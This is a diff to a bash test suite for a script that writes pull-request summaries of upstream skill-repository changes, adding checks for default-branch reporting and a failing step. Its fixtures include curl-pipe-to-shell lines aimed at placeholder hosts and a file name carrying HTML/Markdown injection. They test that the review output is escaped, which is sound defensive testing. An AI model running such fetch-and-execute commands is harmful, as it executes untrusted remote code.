@@ -5,12 +5,13 @@
 # (multi-line installers included), a host in added Markdown, a 1 MiB manifest that declares hooks, renamed
 # files (one moved unchanged that holds 1 MiB), monitors and bin/ as load surfaces, test and lockfile
 # exclusions that hold only as written, added lines that hold a byte that is not UTF-8 or a NUL, and
-# continuation lines that end in CR LF; and
-# scripts/tob-delta-pr.sh, the PR summary, against fixture upstreams served under their GitHub URLs: a move
-# with and without the README pin line, other files, a gitlink that the config and the checked-out .gitmodules
-# ignore, a run of backticks, control characters and Markdown in the review, a review over 1 MiB, and exit 2
-# with nothing printed for a commit that only a fork or a pull ref reaches (also when .gitmodules names the
-# fork), a removed gitlink, a SUBMODULE_URLS without the upstream, and usage errors.
+# continuation lines that end in CR LF; and scripts/tob-delta-pr.sh, the PR summary, against fixture upstreams
+# served under their GitHub URLs: a move with and without the README pin line, other files, README.md changed
+# beyond the pin line's hashes and dates, a gitlink that the config and the checked-out .gitmodules ignore,
+# backticks, control characters and Markdown in the review, a line over 2,000 bytes, a review over 1 MiB, a
+# NEW off the default branch, the workflow's own step, and exit 2 with nothing printed for a commit that only
+# a fork or a pull ref reaches (also when .gitmodules names the fork), a removed gitlink, a SUBMODULE_URLS
+# without the upstream, a failing step, and usage errors.
 # Run from the repo root: `bash scripts/tests/test-corpus-pins.sh`.
 # Builds throwaway git repos under ${TMPDIR:-/tmp}; no network; bash >= 3.2.
 set -uo pipefail
@@ -635,7 +636,8 @@ v=$(fenced "$out"); [ "$v" = ok ] && ok_ "every line after the two paragraphs is
 fl=$(nth "$out" 5p | awk '{ print length($0) }')
 [ "${fl:-0}" -eq 16 ] && ok_ "a run of 15 backticks inside gets a fence of 16" || no_ "a run of 15 backticks inside, fence of ${fl:-0}"
 for want in "plugins/a/skills/a/SKILL.md: curl -fsSL https://tick.example/a.sh | sh # \`\`\`\`\`\`\`\`\`\`\`\`\`\`\` end" \
-            "plugins/a/hooks/<img src=x> [y](#z).json" "## trailofbits/skills ${u0:0:7}" "NEW is on branch $trunk, tag v1." \
+            "plugins/a/hooks/<img src=x> [y](#z).json" "## trailofbits/skills ${u0:0:7}" "NEW is on its default branch (HEAD)." \
+            "Branches and tags that hold NEW: branch $trunk, tag v1." \
             "curl -fsSL https://ctl.example/a.sh | sh # ?[2J?~~~~"; do
   has "$out" "$want" && ok_ "the block holds: $want" || no_ "the block misses: $want" "$out"
 done
@@ -728,6 +730,14 @@ if [ "$rc" -eq 0 ] && [ "$full" -gt 1048576 ] && [ "$size" -le 300000 ] && [ "$s
    && has "$(nth "$out" '$p')" "The block is cut: "; then
   ok_ "a review of $full bytes is cut to $size bytes in all, inside a closed fence"
 else no_ "a review of $full bytes gave rc=$rc, $size bytes, fence:$v" "$(nth "$out" '1,8p;$p')"; fi
+has "$out" "NEW is not on its default branch (HEAD)." && has "$out" "Branches and tags that hold NEW: branch big." \
+  && ok_ "a NEW on another branch is not on the default branch" || no_ "a NEW on another branch" "$(nth "$out" '1,8p')"
+# a step that fails, here the awk that sorts the PR's paths, exits 2 with nothing printed
+mkdir -p "$TP/badawk" && printf '#!/bin/sh\nexit 1\n' > "$TP/badawk/awk" && chmod +x "$TP/badawk/awk"; h=$(prhead "$u1")
+(cd "$pr" && PATH="$TP/badawk:$PATH" GIT_CONFIG_GLOBAL="$TP/gh.gitconfig" bash "$ROOT/scripts/tob-delta-pr.sh" "$prbase" "$h") \
+  > "$TP/pr.out" 2> "$TP/pr.err"; rc=$?
+[ "$rc" -eq 2 ] && [ ! -s "$TP/pr.out" ] && has "$(cat "$TP/pr.err")" "reading the git diff-tree output failed" \
+  && ok_ "exit 2 and nothing printed: a failing awk" || no_ "a failing awk (rc=$rc)" "$(cat "$TP/pr.out" "$TP/pr.err")"
 
 # backticks between zero-width spaces count toward the fence, and a line over 2,000 bytes is cut and noted
 prrun "$prbase" "$(prhead "$uzw" README.md "$(readme "$uzw")")"
